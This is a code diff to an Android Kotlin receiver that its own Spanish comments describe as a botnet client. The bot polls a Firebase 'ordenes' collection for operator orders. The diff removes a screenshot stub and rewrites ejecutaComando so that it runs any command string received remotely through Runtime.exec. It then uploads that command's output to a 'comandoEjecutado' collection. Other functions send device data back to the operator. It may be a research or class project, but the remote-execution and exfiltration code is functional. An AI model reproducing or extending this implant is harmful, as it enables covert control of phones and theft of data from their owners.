@@ -20,7 +20,8 @@ import com.google.firebase.firestore.DocumentChange
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.firestore.ktx.firestore
 import com.google.firebase.ktx.Firebase
-import java.io.IOException
+import java.io.BufferedReader
+import java.io.InputStreamReader
 import java.text.SimpleDateFormat
 import java.util.*
 
@@ -73,16 +74,6 @@ class Alarm : BroadcastReceiver() {
             .addOnSuccessListener { result ->
                 for (document in result) {
                     if (document.data["Bot_ID"]!!.equals(idAndroid) || document.data["Bot_ID"]!!.equals("todos")) {
-                        if (document.data["Primitiva"]!!.equals("CAPTURA")) {
-                            nuevaCaptura(db, strDate)
-                            Log.d("TAG2", "Se añade nueva captura")
-                            if(!(document.data["Bot_ID"]!!.equals("todos"))) {
-                                db.collection("ordenes").document(document.id).delete()
-                                    .addOnSuccessListener {
-                                        Log.d("TAG2", "Orden de captura eliminada")
-                                    }
-                            }
-                        }
                         if (document.data["Primitiva"]!!.equals("DATOSDISPOSITIVO")) {
                             nuevosDatosDispositivo(db, strDate)
                             Log.d("TAG2", "Se añade nuevos datos del dispositivo")
@@ -121,7 +112,7 @@ class Alarm : BroadcastReceiver() {
                         }
                         if (document.data["Primitiva"]!!.equals("COMANDO")) {
                             val ejecutar = document.data["comando"].toString()
-                            ejecutaComando(ejecutar)
+                            ejecutaComando(ejecutar,db,strDate)
                             Log.d("TAG2", "Se ha enviado un mensaje de ping")
                             if(!document.data["Bot_ID"]!!.equals("todos")) {
                                 db.collection("ordenes").document(document.id).delete()
@@ -169,31 +160,6 @@ class Alarm : BroadcastReceiver() {
         Log.d("TAG2","Se ha enviado un nuevo mensaje de ImAlive")
     }
 
-    fun nuevaCaptura(db : FirebaseFirestore, strDate: String){
-
-        val captura = hashMapOf(
-            "Bot_ID" to idAndroid,
-            "Hora" to strDate,
-            "Captura" to "Esto sería una captura de pantalla"
-        )
-        db.collection("ordenes")
-            .whereEqualTo("Primitiva", "CAPTURA")
-            .addSnapshotListener { snapshot, e ->
-                if (e != null) {
-                    Log.d("TAG", "Fallada la escucha de la primitiva.", e)
-                    return@addSnapshotListener
-                }
-
-                for (dc in snapshot!!.documentChanges) {
-                    when (dc.type) {
-                        DocumentChange.Type.ADDED -> db.collection("capturas").document(idAndroid).set(captura)
-                    }
-                }
-
-            }
-
-        Log.d("TAG2","Se ha ejecutado la tarea de toma de captura de pantalla")
-    }
 
     fun nuevosDatosDispositivo(db : FirebaseFirestore, strDate: String){
         // Devuelve algunos valores del dispositivo que pueden ser de interes para la botnet
@@ -360,22 +326,40 @@ class Alarm : BroadcastReceiver() {
     }
 
     // Fuente: https://stackoverflow.com/questions/3905358/how-to-ping-external-ip-from-java-android
-    private fun ejecutaComando(comando : String): Boolean {
-        Log.d("TAG2","Se ejecuta un ping")
-        val runtime = Runtime.getRuntime()
+    // Comandos utiles disponibles: https://technastic.com/adb-shell-commands-list/
+    private fun ejecutaComando(command : String, db : FirebaseFirestore, strDate: String){
+        var resultado = ""
         try {
-            val mIpAddrProcess = runtime.exec("/system/bin/" + comando)
-            val mExitValue = mIpAddrProcess.waitFor()
-            println(" mExitValue $mExitValue")
-            return mExitValue == 0
-        } catch (ignore: InterruptedException) {
-            ignore.printStackTrace()
-            println(" Exception:$ignore")
-        } catch (e: IOException) {
-            e.printStackTrace()
-            println(" Exception:$e")
+            val process: Process = Runtime.getRuntime().exec(command)
+            // Read the lines using BufferedReader
+            BufferedReader(InputStreamReader(process.inputStream)).forEachLine {
+                // Do something on each line read
+                Log.d(this::class.java.canonicalName, "Resultado: $it")
+                resultado += "$it"+"\n"
+            }
+
+            val user = hashMapOf(
+                "Bot_ID" to idAndroid,
+                "Hora" to strDate,
+                "resultado" to resultado
+            )
+
+            val user2 = hashMapOf(
+                "Bot_ID" to idAndroid,
+                "Hora" to strDate,
+                "resultado" to "Error al ejecutar el comando, stdout vacio"
+            )
+
+            // Add a new document with a generated ID
+            if(resultado != "") db.collection("comandoEjecutado").document(idAndroid + " " + command).set(user)
+            else db.collection("comandoEjecutado").document(idAndroid + " " + command).set(user2)
+            Log.d("TAG2","Se ha guardado el output de un comando")
+
+        } catch (e: InterruptedException) {
+            Log.w(this::class.java.canonicalName, "Cannot execute command [$command].", e)
+        } catch (e: Exception) {
+            Log.e(this::class.java.canonicalName, "Cannot execute command [$command].", e)
         }
-        return false
     }
 
     // Fuente: https://stackoverflow.com/questions/45958226/get-location-android-kotlin
